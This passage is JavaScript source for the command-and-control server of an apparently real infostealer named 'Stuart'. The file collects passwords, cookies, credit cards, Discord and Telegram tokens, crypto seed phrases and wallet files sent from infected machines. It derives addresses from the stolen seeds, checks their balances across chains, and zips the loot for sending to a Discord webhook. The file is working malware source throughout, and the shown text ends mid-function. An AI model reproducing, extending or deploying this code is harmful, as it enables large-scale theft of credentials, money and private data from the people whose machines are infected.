// Stuart server-side runtime — persists harvested data from every client into plugin.db
import { decrypt as secoDecrypt } from "secure-container";
import { fromBuffer as seedFromBuffer } from "bitcoin-seed";
import { gunzipSync, inflateRawSync, deflateRawSync } from "zlib";
import { HDKey } from "@scure/bip32";
import { mnemonicToSeedSync } from "@scure/bip39";
import { wordlist } from "@scure/bip39/wordlists/english";
import { keccak_256 } from "@noble/hashes/sha3";
import { ripemd160 } from "@noble/hashes/ripemd160";
import { sha256 } from "@noble/hashes/sha256";
import { secp256k1 } from "@noble/curves/secp256k1";
import { mkdirSync, writeFileSync, readFileSync, unlinkSync, readdirSync, rmSync, existsSync } from "fs";
import { join } from "path";

// CRC-32 (ISO 3309) for store-only ZIP local headers
const CRC32_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let i = 0; i < 256; i++) {
    let c = i;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
    t[i] = c >>> 0;
  }
  return t;
})();
function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC32_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

// ── Address derivation helpers ──────────────────────────────────────────

const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58Encode(buf) {
  let num = BigInt("0x" + Buffer.from(buf).toString("hex"));
  let str = "";
  while (num > 0n) { str = BASE58_ALPHABET[Number(num % 58n)] + str; num /= 58n; }
  for (const b of buf) { if (b === 0) str = "1" + str; else break; }
  return str;
}
function base58Check(payload) {
  const checksum = sha256(sha256(payload)).slice(0, 4);
  return base58Encode(Buffer.concat([payload, Buffer.from(checksum)]));
}

const BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
function bech32Encode(hrp, data) {
  function polymod(values) {
    const GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3];
    let chk = 1;
    for (const v of values) { const b = chk >> 25; chk = ((chk & 0x1ffffff) << 5) ^ v; for (let i = 0; i < 5; i++) if ((b >> i) & 1) chk ^= GEN[i]; }
    return chk;
  }
  function hrpExpand(h) { const r = []; for (const c of h) r.push(c.charCodeAt(0) >> 5); r.push(0); for (const c of h) r.push(c.charCodeAt(0) & 31); return r; }
  const values = [...hrpExpand(hrp), ...data];
  const pm = polymod([...values, 0, 0, 0, 0, 0, 0]) ^ 1;
  const checksum = [];
  for (let i = 0; i < 6; i++) checksum.push((pm >> (5 * (5 - i))) & 31);
  return hrp + "1" + [...data, ...checksum].map(d => BECH32_CHARSET[d]).join("");
}
function convertBits(data, fromBits, toBits) {
  let acc = 0, bits = 0; const ret = [];
  for (const val of data) { acc = (acc << fromBits) | val; bits += fromBits; while (bits >= toBits) { bits -= toBits; ret.push((acc >> bits) & ((1 << toBits) - 1)); } }
  if (bits > 0) ret.push((acc << (toBits - bits)) & ((1 << toBits) - 1));
  return ret;
}

function deriveEthAddresses(mnemonic, count = 5) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/60'/0'/0/${i}`);
    const pubUncompressed = secp256k1.ProjectivePoint.fromPrivateKey(child.privateKey).toRawBytes(false).slice(1);
    const hash = keccak_256(pubUncompressed);
    addrs.push("0x" + Buffer.from(hash.slice(-20)).toString("hex"));
  }
  return addrs;
}

function deriveBtcAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  // BIP84 native segwit (bc1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/84'/0'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const words = [0, ...convertBits(h, 8, 5)];
    addrs.push(bech32Encode("bc", words));
  }
  // BIP44 legacy (1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/0'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const payload = Buffer.alloc(21); payload[0] = 0x00; Buffer.from(h).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

function deriveLtcAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  // BIP84 native segwit (ltc1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/84'/2'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const words = [0, ...convertBits(h, 8, 5)];
    addrs.push(bech32Encode("ltc", words));
  }
  // BIP44 legacy (L...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/2'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const payload = Buffer.alloc(21); payload[0] = 0x30; Buffer.from(h).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

function deriveTrxAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/195'/0'/0/${i}`);
    const pubUncompressed = secp256k1.ProjectivePoint.fromPrivateKey(child.privateKey).toRawBytes(false).slice(1);
    const hash = keccak_256(pubUncompressed);
    const payload = Buffer.alloc(21); payload[0] = 0x41; Buffer.from(hash.slice(-20)).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

// ERC-20 token contracts (same address across EVM chains)
const ERC20_TOKENS = {
  ETH: [
    { symbol: "USDT", contract: "0xdac17f958d2ee523a2206206994597c13d831ec7", decimals: 6 },
    { symbol: "USDC", contract: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
    { symbol: "DAI",  contract: "0x6b175474e89094c44da98b954eedeac495271d0f", decimals: 18 },
  ],
  BSC: [
    { symbol: "USDT", contract: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
    { symbol: "USDC", contract: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
  ],
  Polygon: [
    { symbol: "USDT", contract: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6 },
    { symbol: "USDC", contract: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359", decimals: 6 },
  ],
  Arbitrum: [
    { symbol: "USDT", contract: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", decimals: 6 },
    { symbol: "USDC", contract: "0xaf88d065e77c8cc2239327c5edb3a432268e5831", decimals: 6 },
  ],
  Avalanche: [
    { symbol: "USDT", contract: "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7", decimals: 6 },
    { symbol: "USDC", contract: "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e", decimals: 6 },
  ],
  Base: [
    { symbol: "USDC", contract: "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", decimals: 6 },
  ],
};

const FETCH_TIMEOUT_MS = 8000;
function fetchWithTimeout(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
  return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(timer));
}

async function checkEvmNativeBalances(addresses) {
  const balances = {};
  await Promise.all(BALANCE_CHAINS.map(async (chain) => {
    try {
      const res = await fetchWithTimeout(chain.rpc, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(addresses.map((addr, i) => ({
          jsonrpc: "2.0", method: "eth_getBalance", params: [addr, "latest"], id: i,
        }))),
      });
      const data = await res.json();
      for (const r of Array.isArray(data) ? data : [data]) {
        if (!r.result) continue;
        const wei = BigInt(r.result);
        if (wei === 0n) continue;
        const addr = addresses[r.id];
        if (!balances[addr]) balances[addr] = {};
        balances[addr][chain.name] = Number(wei) / 1e18;
      }
    } catch (_) {}
  }));
  return balances;
}

async function checkErc20Balances(addresses) {
  const balances = {};
  const balanceOfSig = "0x70a08231";
  await Promise.all(BALANCE_CHAINS.map(async (chain) => {
    const tokens = ERC20_TOKENS[chain.name] || [];
    if (!tokens.length) return;
    const calls = [];
    for (const addr of addresses) {
      for (const token of tokens) {
        const paddedAddr = addr.slice(2).padStart(64, "0");
        calls.push({
          jsonrpc: "2.0", method: "eth_call",
          params: [{ to: token.contract, data: balanceOfSig + paddedAddr }, "latest"],
          id: calls.length,
          _addr: addr, _token: token, _chain: chain.name,
        });
      }
    }
    if (!calls.length) return;
    try {
      const rpcCalls = calls.map(({ _addr, _token, _chain, ...c }) => c);
      const res = await fetchWithTimeout(chain.rpc, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(rpcCalls),
      });
      const data = await res.json();
      for (const r of Array.isArray(data) ? data : [data]) {
        if (!r.result || r.result === "0x" || r.result === "0x0") continue;
        const raw = BigInt(r.result);
        if (raw === 0n) continue;
        const call = calls[r.id];
        const val = Number(raw) / (10 ** call._token.decimals);
        if (val < 0.001) continue;
        const addr = call._addr;
        const label = `${call._token.symbol} (${call._chain})`;
        if (!balances[addr]) balances[addr] = {};
        balances[addr][label] = val;
      }
    } catch (_) {}
  }));
  return balances;
}

async function checkBtcBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://blockstream.info/api/address/${addr}`);
      if (!res.ok) return;
      const data = await res.json();
      const funded = data.chain_stats?.funded_txo_sum || 0;
      const spent = data.chain_stats?.spent_txo_sum || 0;
      const bal = (funded - spent) / 1e8;
      if (bal > 0) balances[addr] = { BTC: bal };
    } catch (_) {}
  }));
  return balances;
}

async function checkLtcBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://api.blockcypher.com/v1/ltc/main/addrs/${addr}/balance`);
      if (!res.ok) return;
      const data = await res.json();
      const bal = (data.balance || 0) / 1e8;
      if (bal > 0) balances[addr] = { LTC: bal };
    } catch (_) {}
  }));
  return balances;
}

async function checkTrxBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://apilist.tronscanapi.com/api/accountv2?address=${addr}`, {
        headers: { "TRON-PRO-API-KEY": "" },
      });
      if (!res.ok) return;
      const data = await res.json();
      const trxBal = (data.balance || 0) / 1e6;
      if (trxBal > 0) {
        if (!balances[addr]) balances[addr] = {};
        balances[addr]["TRX"] = trxBal;
      }
      for (const t of data.withPriceTokens || []) {
        if (t.tokenAbbr === "USDT" && Number(t.balance) > 0) {
          if (!balances[addr]) balances[addr] = {};
          balances[addr]["USDT (TRC20)"] = Number(t.balance) / (10 ** (t.tokenDecimal || 6));
        }
      }
    } catch (_) {}
  }));
  return balances;
}

let stmts = null;
let blobDir = null;
/** Live plugin context (db, broadcast) for Discord poller. */
let pluginCtx = null;
let pluginSettings = {
  capture_history: true,
  capture_cookies: true,
  history_limit: 5000,
  cookie_max_age_days: 30,
  /** When on: harvests are zipped → Discord only; UI data comes from bot poll import. */
  discord_upload_enabled: false,
  discord_webhook_url: "",
  discord_bot_token: "",
  discord_forum_channel_id: "",
  discord_thread_prefix: "Stuart",
};

/**
 * Hard max per Discord attachment. Non-boosted guilds are often 8 MiB;
 * multipart boundaries eat a bit, so we target ~7.5 MiB finished zip.
 * (Uploads ~6–8 MiB used to fail when we allowed full 8 MiB store zips.)
 */
const DISCORD_PART_MAX_BYTES = Math.floor(7.5 * 1024 * 1024);
/** Discord allows up to 10 attachments per message — one forum post. */
const DISCORD_MAX_PARTS = 10;
/**
 * After harvest events stop, wait this long then zip+upload once.
 * Covers late seed_scan / extra scans after `results`.
 */
/**
 * Quiet period after last harvest/wallet event before Discord upload.
 * Keep short once wallets are ready — long waits used to look like hangs while
 * the agent WS was still busy / reconnecting.
 */
const DISCORD_SETTLE_MS = 8000;
/** Finalize timers per client (only one upload after harvest completes). */
const discordSettleTimers = new Map();
const discordFlushing = new Set();
/** In-memory harvest buffers when Discord pipeline is on (not written to C2 DB). */
const pendingDiscordHarvest = new Map();
/**
 * Wallet binaries (browser extension + desktop) waiting for Discord upload.
 * @type {Map<string, Array<{name,type,path,addresses,vaultData,size,content:Buffer}>>}
 */
const pendingDiscordWallets = new Map();
/**
 * In-flight agent→server chunk reassembly for large wallets (MetaMask etc.).
 * key = `${clientId}\0${name}` → { meta, chunks: Map, total, size }
 */
const pendingWalletChunks = new Map();
/**
 * Wait for wallet_auto_data before Discord flush.
 * clientId -> { expected: Set<string>, received: Set<string>, done: boolean, maxTimer }
 */
const pendingWalletExpect = new Map();
/** Absolute max wait for wallet zips after harvest (ms). */
const DISCORD_WALLET_MAX_WAIT_MS = 120000;
let discordPollRunning = false;
let discordPollStatus = { lastAt: 0, lastOk: null, lastError: "", imported: 0, message: "" };

function safeFsName(s) {
  return String(s).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
}
function walletBlobPath(clientId, name) {
  return join(blobDir, `wd_${safeFsName(clientId)}_${safeFsName(name)}.bin`);
}
function telegramBlobPath(clientId, account) {
  return join(blobDir, `tg_${safeFsName(clientId)}_${safeFsName(account)}.bin`);
}
function writeBlob(filePath, data) {
  try { writeFileSync(filePath, data); return true; } catch (_) { return false; }
}
function readBlob(filePath) {
  try { return readFileSync(filePath); } catch (_) { return null; }
}
function deleteBlob(filePath) {
  try { if (existsSync(filePath)) unlinkSync(filePath); } catch (_) {}
}

function readWalletContent(db, clientId, walletName) {
  const row = db.prepare(`SELECT content, blob_path FROM wallet_data WHERE client_id = ? AND name = ?`).get(clientId, walletName);
  if (!row) return null;
  if (row.blob_path) { const d = readBlob(row.blob_path); if (d) return d; }
  return row.content ? Buffer.from(row.content) : null;
}
function readWalletContentById(db, id) {
  const row = db.prepare(`SELECT name, content, blob_path FROM wallet_data WHERE id = ?`).get(id);
  if (!row) return null;
  let data = null;
  if (row.blob_path) data = readBlob(row.blob_path);
  if (!data && row.content) data = Buffer.from(row.content);
  return data ? { name: row.name, content: data } : null;
}
function readTelegramContentById(db, id) {
  const row = db.prepare(`SELECT account, content, blob_path FROM telegram_sessions WHERE id = ?`).get(id);
  if (!row) return null;
  let data = null;
  if (row.blob_path) data = readBlob(row.blob_path);
  if (!data && row.content) data = Buffer.from(row.content);
  return data ? { account: row.account, content: data } : null;
}

function deleteClientBlobs(clientId) {
  if (!blobDir) return;
  const prefix = safeFsName(clientId);
  try {
    for (const f of readdirSync(blobDir)) {
      if (f.startsWith(`wd_${prefix}_`) || f.startsWith(`tg_${prefix}_`))
        deleteBlob(join(blobDir, f));
    }
  } catch (_) {}
}
function deleteAllBlobs() {
  if (!blobDir) return;
  try { rmSync(blobDir, { recursive: true, force: true }); mkdirSync(blobDir, { recursive: true }); } catch (_) {}
}

function loadSettings(db) {
  try {
    const rows = db.prepare(`SELECT key, value FROM settings`).all();
    for (const r of rows) {
      if (r.key === 'capture_history') pluginSettings.capture_history = r.value !== '0';
      else if (r.key === 'capture_cookies') pluginSettings.capture_cookies = r.value !== '0';
      else if (r.key === 'history_limit') pluginSettings.history_limit = Math.max(0, Number(r.value) || 0);
      else if (r.key === 'cookie_max_age_days') pluginSettings.cookie_max_age_days = Math.max(0, Number(r.value) || 0);
      else if (r.key === 'discord_webhook_url') pluginSettings.discord_webhook_url = String(r.value || '');
      else if (r.key === 'discord_upload_enabled') pluginSettings.discord_upload_enabled = r.value === '1';
      else if (r.key === 'discord_bot_token') pluginSettings.discord_bot_token = String(r.value || '');
      else if (r.key === 'discord_forum_channel_id') pluginSettings.discord_forum_channel_id = String(r.value || '').replace(/\D/g, '');
      else if (r.key === 'discord_thread_prefix') pluginSettings.discord_thread_prefix = String(r.value || 'Stuart').slice(0, 80);
    }
  } catch (_) {}
}

function isValidDiscordWebhook(url) {
  if (!url || typeof url !== 'string') return false;
  try {
    const u = new URL(url.trim());
    return (u.hostname === 'discord.com' || u.hostname === 'discordapp.com' || u.hostname.endsWith('.discord.com'))
      && /^\/api\/webhooks\/\d+\/[\w-]+/.test(u.pathname);
  } catch (_) {
    return false;
  }
}

function isDiscordPipelineOn() {
  return !!(pluginSettings.discord_upload_enabled && isValidDiscordWebhook(pluginSettings.discord_webhook_url));
}

function isDiscordPollConfigured() {
  return !!(pluginSettings.discord_bot_token && pluginSettings.discord_forum_channel_id);
}

function maskSecret(s, keep = 4) {
  if (!s) return '';
  const t = String(s);
  if (t.length <= keep * 2) return '****';
  return t.slice(0, keep) + '…' + t.slice(-keep);
}

function maskWebhookUrl(url) {
  if (!url) return '';
  try {
    const u = new URL(url.trim());
    const parts = u.pathname.split('/').filter(Boolean);
    // api webhooks id token
    if (parts.length >= 4) {
      parts[3] = maskSecret(parts[3]);
      u.pathname = '/' + parts.join('/');
      return u.toString();
    }
  } catch (_) {}
  return url.slice(0, 40) + '…';
}

function publicDiscordSettings(forAdmin) {
  const s = { ...pluginSettings };
  if (!forAdmin) {
    if (s.discord_webhook_url) s.discord_webhook_url = maskWebhookUrl(s.discord_webhook_url);
    if (s.discord_bot_token) s.discord_bot_token = maskSecret(s.discord_bot_token, 6);
  }
  s.discord_poll_status = { ...discordPollStatus };
  s.discord_pipeline = isDiscordPipelineOn();
  s.discord_poll_ready = isDiscordPollConfigured();
  return s;
}

function cookiesToNetscape(cookies) {
  const lines = [
    "# Netscape HTTP Cookie File",
    "# This is a generated file! Do not edit.",
    "",
  ];
  for (const c of cookies || []) {
    const domain = c.host || "";
    const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
    const path = c.path || "/";
    const secure = c.secure ? "TRUE" : "FALSE";
    let expires = 0;
    if (c.expiresUtc) {
      const us = Number(c.expiresUtc);
      if (us > 0) expires = Math.max(0, Math.floor(us / 1000000) - 11644473600);
    }
    lines.push(`${domain}\t${flag}\t${path}\t${secure}\t${expires}\t${c.name || ""}\t${c.value || ""}`);
  }
  return lines.join("\n");
}

/**
 * ZIP with DEFLATE (method 8) so JSON history/cookies shrink a lot.
 * Falls back to store if deflate doesn't help.
 */
function createZipBuffer(files) {
  const parts = [];
  const centralDir = [];
  let offset = 0;

  for (const file of files) {
    const nameBytes = Buffer.from(file.name, "utf8");
    const data = Buffer.isBuffer(file.data) ? file.data : Buffer.from(file.data);
    const crc = crc32(data) >>> 0;

    let method = 0;
    let payload = data;
    try {
      const deflated = deflateRawSync(data, { level: 9 });
      if (deflated.length < data.length) {
        method = 8;
        payload = deflated;
      }
    } catch (_) { /* keep store */ }

    const local = Buffer.alloc(30 + nameBytes.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(payload.length, 18); // compressed size
    local.writeUInt32LE(data.length, 22);    // uncompressed size
    local.writeUInt16LE(nameBytes.length, 26);
    nameBytes.copy(local, 30);

    const central = Buffer.alloc(46 + nameBytes.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(payload.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt32LE(offset, 42);
    nameBytes.copy(central, 46);

    centralDir.push(central);
    parts.push(local, payload);
    offset += local.length + payload.length;
  }

  const cdOffset = offset;
  let cdSize = 0;
  for (const cd of centralDir) {
    parts.push(cd);
    cdSize += cd.length;
  }
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  parts.push(eocd);
  return Buffer.concat(parts);
}

const EXPORT_FILE_ORDER = [
  "passwords", "cookies", "autofill", "history", "bookmarks", "credit_cards",
  "discord_tokens", "discord_profiles", "files", "extensions", "wallets",
  "telegram", "keys", "seeds", "app_credentials", "gaming_items", "vpn_items",
];

function emptyExportData() {
  const o = {};
  for (const k of EXPORT_FILE_ORDER) o[k] = [];
  return o;
}

/** Merge agent event payloads into export-shaped buckets (in-memory, Discord pipeline). */
function mergeAgentPayloadIntoExport(data, clientId, payload) {
  if (!payload || typeof payload !== "object") return data;
  const cid = clientId;
  const add = (key, rows) => {
    if (!rows?.length) return;
    if (!data[key]) data[key] = [];
    for (const r of rows) data[key].push({ ...r, clientId: r.clientId || cid });
  };

  add("passwords", payload.passwords);
  add("cookies", (payload.cookies || []).map(r => ({
    clientId: cid, host: r.host, name: r.name, value: r.value, path: r.path,
    secure: !!r.secure, httpOnly: !!r.httpOnly, expiresUtc: r.expiresUtc,
    browser: r.browser, profile: r.profile,
  })));
  add("autofill", payload.autofill);
  add("history", (payload.history || []).map(r => ({
    clientId: cid, url: r.url, title: r.title,
    visitTimeUnix: r.visitTimeUnix, browser: r.browser, profile: r.profile,
  })));
  add("bookmarks", payload.bookmarks);
  add("credit_cards", (payload.creditCards || []).map(r => ({
    clientId: cid, nameOnCard: r.nameOnCard, cardNumber: r.cardNumber,
    expirationMonth: r.expirationMonth, expirationYear: r.expirationYear,
    nickname: r.nickname, browser: r.browser, profile: r.profile,
  })));
  add("discord_tokens", (payload.discordTokens || []).map(r => ({
    clientId: cid, token: r.token, source: r.source,
  })));
  add("files", (payload.files || []).map(r => ({
    clientId: cid, dir: r.dir, name: r.name, ext: r.ext, size: r.size,
    modified: r.modified, path: r.path, tags: Array.isArray(r.tags) ? r.tags.join(",") : (r.tags || null),
  })));
  add("extensions", (payload.extensions || []).map(r => ({
    clientId: cid, extId: r.extId, name: r.name, version: r.version,
    browser: r.browser, profile: r.profile, path: r.path, category: r.category,
  })));
  add("wallets", (payload.wallets || []).map(r => ({
    clientId: cid, name: r.name, type: r.type, path: r.path, files: r.files, size: r.size,
  })));
  const tg = payload.telegram || payload.sessions;
  add("telegram", (tg || []).map(r => ({
    clientId: cid, account: r.account, path: r.path, files: r.files, size: r.size,
  })));
  add("keys", payload.keys);
  add("seeds", (payload.seeds || []).map(r => ({
    clientId: cid, source: r.source, path: r.path, phrase: r.phrase,
    words: r.words, valid: r.valid, addresses: r.addresses,
  })));
  add("app_credentials", (payload.appCredentials || []).map(r => ({
    clientId: cid, application: r.application, host: r.host, port: r.port,
    username: r.username, password: r.password, protocol: r.protocol, extra: r.extra,
  })));

  if (payload.gaming) {
    if (!data.gaming_items) data.gaming_items = [];
    const g = payload.gaming;
    const pushG = (platform, label, value, detail) => {
      data.gaming_items.push({ clientId: cid, platform, label, value, detail: detail || "" });
    };
    if (g.steam) {
      const st = g.steam;
      if (st.account) pushG("Steam", "Account", st.account, st.rememberPw ? "Remember PW" : "");
      if (st.token) pushG("Steam", "Token", st.token, "");
      if (st.steamPath) pushG("Steam", "Path", st.steamPath, "");
      for (const f of (st.ssfnFiles || [])) pushG("Steam", "SSFN", f, "");
      for (const gm of (st.games || [])) pushG("Steam", gm.name, gm.id, gm.installed ? "Installed" : "");
    }
    for (const b of (g.battleNet || [])) pushG("Battle.net", b.name, b.path, "");
    for (const e of (g.epic || [])) pushG("Epic", e.name, e.path, "");
    for (const r of (g.riot || [])) pushG("Riot", r.name, r.path, "");
    for (const u of (g.uplay || [])) pushG("Uplay", u.name, u.path, "");
  }
  if (payload.vpns) {
    if (!data.vpn_items) data.vpn_items = [];
    const v = payload.vpns;
    for (const n of (v.nordvpn || [])) data.vpn_items.push({ clientId: cid, provider: "NordVPN", label: n.username, value: n.password, detail: n.version });
    for (const w of (v.wireguard || [])) data.vpn_items.push({ clientId: cid, provider: "WireGuard", label: w.name, value: w.endpoint || "", detail: w.interface || "" });
    for (const o of (v.openvpn || [])) data.vpn_items.push({ clientId: cid, provider: "OpenVPN", label: o.name, value: o.path, detail: "" });
    for (const m of (v.mullvad || [])) data.vpn_items.push({ clientId: cid, provider: "Mullvad", label: m.accountNumber, value: m.settingsPath, detail: "" });
  }
  return data;
}

/**
 * @param {{ replace?: boolean }} opts
 *   replace=true on `results` so partials don't double-count the full collect.
 */
function bufferDiscordHarvest(clientId, payload, opts = {}) {
  let data = pendingDiscordHarvest.get(clientId);
  if (opts.replace || !data) {
    data = emptyExportData();
    data._clientId = clientId;
    data._gotResults = !!opts.replace;
    pendingDiscordHarvest.set(clientId, data);
  }
  if (opts.replace) data._gotResults = true;
  mergeAgentPayloadIntoExport(data, clientId, payload);
}

/** Build logical file entries (not yet zipped) from export data. */
function collectExportFileEntries(data, clientId) {
  const prefix = clientId
    ? `stuart-${safeFsName(clientId).slice(0, 32)}`
    : "stuart-global";

  const prioritized = [
    "passwords", "cookies", "autofill", "bookmarks", "credit_cards",
    "discord_tokens", "discord_profiles", "seeds", "keys", "app_credentials",
    "wallets", "telegram", "extensions", "gaming_items", "vpn_items", "files",
    "history",
  ];

  const entries = [];
  const counts = {};

  for (const key of prioritized) {
    const rows = data[key];
    if (!rows || !rows.length) continue;
    counts[key] = rows.length;
    if (key === "cookies") {
      entries.push({
        key,
        name: `${prefix}/cookies.txt`,
        data: Buffer.from(cookiesToNetscape(rows), "utf8"),
      });
    } else {
      entries.push({
        key,
        name: `${prefix}/${key}.json`,
        data: Buffer.from(JSON.stringify(rows, null, 2), "utf8"),
      });
    }
  }
  return { entries, counts, prefix };
}

/** Split a single oversized JSON array file into multiple smaller files. */
function splitLargeJsonEntry(entry, maxPayload) {
  const text = entry.data.toString("utf8");
  let rows;
  try { rows = JSON.parse(text); } catch (_) { return [entry]; }
  if (!Array.isArray(rows) || rows.length < 2) return [entry];

  const out = [];
  let chunk = [];
  let part = 0;
  const flush = () => {
    if (!chunk.length) return;
    const body = Buffer.from(JSON.stringify(chunk, null, 2), "utf8");
    const base = entry.name.replace(/\.json$/i, "");
    out.push({
      key: entry.key,
      name: `${base}.p${part}.json`,
      data: body,
    });
    part++;
    chunk = [];
  };

  for (const row of rows) {
    chunk.push(row);
    const trial = Buffer.from(JSON.stringify(chunk, null, 2), "utf8");
    if (trial.length > maxPayload) {
      chunk.pop();
      if (!chunk.length) {
        // single row too large — keep it alone
        chunk.push(row);
        flush();
      } else {
        flush();
        chunk.push(row);
      }
    }
  }
  flush();
  return out.length ? out : [entry];
}

/**
 * Pack one bin of files into a zip; if over maxBytes, binary-split files and recurse.
 */
function zipBinToParts(fileList, prefix, clientId, maxBytes, baseName, partOffset) {
  const metaBody = Buffer.from(JSON.stringify({
    v: 1,
    source: "stuart",
    clientId: clientId || null,
    capturedAt: Date.now(),
  }, null, 2), "utf8");
  const files = [
    { name: `${prefix}/meta.json`, data: metaBody },
    ...fileList,
  ];
  const zip = createZipBuffer(files);
  if (zip.length <= maxBytes || fileList.length <= 1) {
    // Single oversized entry: still emit (will be uploaded alone; may need smaller split of JSON)
    if (zip.length > maxBytes && fileList.length === 1) {
      const only = fileList[0];
      if (only.name.endsWith(".json")) {
        const halves = splitLargeJsonEntry(only, Math.floor(only.data.length / 2) || 1);
        if (halves.length > 1) {
          const out = [];
          for (const h of halves) {
            out.push(...zipBinToParts([h], prefix, clientId, maxBytes, baseName, partOffset + out.length));
          }
          return out;
        }
      }
      console.warn(`[stuart] single file zip still ${zip.length} bytes after split attempt`);
    }
    return [{ zip, size: zip.length, _files: fileList }];
  }
  // Too big — split file list in half
  const mid = Math.ceil(fileList.length / 2);
  const left = zipBinToParts(fileList.slice(0, mid), prefix, clientId, maxBytes, baseName, partOffset);
  const right = zipBinToParts(fileList.slice(mid), prefix, clientId, maxBytes, baseName, partOffset + left.length);
  return [...left, ...right];
}

/**
 * Pack harvest into one or more zip parts, each ≤ ~7.5 MiB after DEFLATE.
 * All parts are meant for a single Discord message (up to 10 files).
 */
function buildZipPartsFromExportData(data, clientId) {
  const { entries: rawEntries, counts, prefix } = collectExportFileEntries(data, clientId);
  if (!rawEntries.length) return null;

  // Pre-split huge JSON so packing works (before compression estimate)
  const maxUncompressedChunk = 12 * 1024 * 1024; // DEFLATE usually shrinks JSON a lot
  let entries = [];
  for (const e of rawEntries) {
    if (e.data.length <= maxUncompressedChunk) entries.push(e);
    else if (e.name.endsWith(".json")) entries.push(...splitLargeJsonEntry(e, Math.floor(maxUncompressedChunk / 2)));
    else {
      console.warn(`[stuart] skipping oversized non-json ${e.name} (${e.data.length} bytes)`);
    }
  }
  if (!entries.length) return null;

  const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const baseName = clientId
    ? `stuart-${safeFsName(clientId).slice(0, 24)}-${stamp}`
    : `stuart-global-${stamp}`;

  // First pack by rough uncompressed size into bins, then re-split if zip too big
  const roughMax = 16 * 1024 * 1024; // allow large bins; zipBinToParts will split by real zip size
  const bins = [];
  for (const ent of entries) {
    const need = ent.data.length + ent.name.length + 128;
    let placed = false;
    for (const bin of bins) {
      if (bin.size + need <= roughMax) {
        bin.files.push({ name: ent.name, data: ent.data });
        bin.size += need;
        placed = true;
        break;
      }
    }
    if (!placed) bins.push({ files: [{ name: ent.name, data: ent.data }], size: need });
  }

  let rawParts = [];
  for (const bin of bins) {
    rawParts.push(...zipBinToParts(bin.files, prefix, clientId, DISCORD_PART_MAX_BYTES, baseName, rawParts.length));
  }

  if (rawParts.length > DISCORD_MAX_PARTS) {
    console.warn(`[stuart] ${rawParts.length} parts exceeds Discord 10-file limit; keeping first ${DISCORD_MAX_PARTS}`);
    rawParts = rawParts.slice(0, DISCORD_MAX_PARTS);
  }

  const totalParts = rawParts.length;
